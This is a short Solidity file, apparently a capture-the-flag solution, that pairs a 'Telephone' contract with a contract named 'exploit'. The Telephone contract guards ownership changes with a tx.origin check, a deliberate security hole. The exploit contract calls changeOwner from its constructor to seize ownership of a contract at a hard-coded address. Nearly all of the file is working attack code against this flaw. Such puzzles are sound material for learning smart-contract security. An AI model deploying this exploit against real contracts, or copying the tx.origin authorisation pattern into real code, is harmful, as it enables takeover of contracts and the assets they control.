// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract exploit {
    Telephone public target = Telephone(0x64069AD99e845e830D50a4cD1d26e5c1de46EC67);
    
    constructor() {
        target.changeOwner(msg.sender);
    }
}